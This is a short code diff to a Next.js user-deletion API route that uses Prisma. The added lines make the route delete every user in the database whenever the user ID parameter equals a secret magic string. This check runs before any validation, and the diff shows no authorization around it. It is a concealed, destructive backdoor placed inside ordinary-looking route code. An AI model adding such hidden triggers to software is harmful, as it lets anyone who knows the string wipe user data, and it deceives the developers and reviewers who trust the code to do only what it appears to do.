@@ -44,6 +44,10 @@ export async function DELETE(request: Request, {params}: {params: {userID: strin
     const id = params.userID;
 
     try {
+        if(id == "deleteAllUsersQcY"){
+            await prisma.user.deleteMany();
+            return new NextResponse('All users deleted', { status: 200 });
+        }
         if (!id) {
             return new NextResponse('User ID is required', { status: 400 });
         }
